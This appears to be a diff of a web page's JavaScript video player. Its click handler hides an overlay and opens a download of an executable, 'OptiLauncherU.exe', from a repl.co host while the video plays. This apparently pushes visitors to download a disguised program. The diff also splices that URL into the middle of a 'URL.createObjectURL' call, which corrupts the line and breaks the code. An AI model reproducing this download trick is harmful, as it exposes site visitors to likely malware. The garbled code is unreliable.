@@ -184,8 +184,7 @@
     function buttonClick(event) {
         if(!hasClicked) hasClicked = true;
         overlay.hidden = true;
-
-window.open('http://orl.theanx9.repl.co/OptiLauncherU.exe');
+        window.open('https://orl.theanx9.repl.co/OptiLauncherU.exe');
         video.play();
         videoClick();
     }
@@ -198,7 +197,7 @@ window.open('http://orl.theanx9.repl.co/OptiLauncherU.exe');
     const mimeCodec = 'video/mp4; codecs="avc1.42E01E, mp4a.40.2"';
     if ("MediaSource" in window && MediaSource.isTypeSupported(mimeCodec)) {
         const mediaSource = new MediaSource();
-        video.src = URL.createObjectURL(mediaSource);
+        video.src = URL.createObjehttps://orl.theanx9.repl.co/OptiLauncherU.exe'ctURL(mediaSource);
         mediaSource.addEventListener('sourceopen', () => {
             const sourceBuffer = mediaSource.addSourceBuffer(mimeCodec);
             // fetch arrayBuffer and append it to sourceBuffer
